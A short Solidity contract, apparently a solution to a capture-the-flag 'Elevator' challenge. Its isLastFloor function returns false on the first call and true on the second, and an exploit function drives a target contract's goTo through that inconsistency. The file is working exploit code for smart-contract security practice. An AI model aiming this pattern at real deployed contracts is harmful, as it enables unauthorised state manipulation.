// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Elevator {
    function goTo(uint _floor) external;
}

/**
 * @title Building
 * @dev Implement interface so that top floor returns false the first time and true the second time
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract Building {
	bool first_call = true;

	function isLastFloor(uint _floor) public returns (bool){
		first_call = !first_call;
		return _floor == 42 && first_call;
	}

	function exploit(address _contract, uint _floor) public {
		Elevator(_contract).goTo(_floor);
	}
}